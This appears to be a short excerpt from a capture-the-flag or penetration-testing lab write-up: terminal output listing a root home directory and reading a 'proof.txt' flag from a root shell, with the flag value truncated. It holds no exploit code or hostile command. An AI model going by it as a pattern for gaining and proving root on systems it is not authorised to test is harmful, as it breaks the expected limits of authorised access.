drwx------  3 root root 4096 Feb  9 21:05 .
drwxr-xr-x 22 root root 4096 Apr 24  2020 ..
-rw-------  1 root root   60 Jan 30  2024 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Jan 30  2024 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb  9 21:05 proof.txt
bash-4.4# cat proof.txt
b80...
```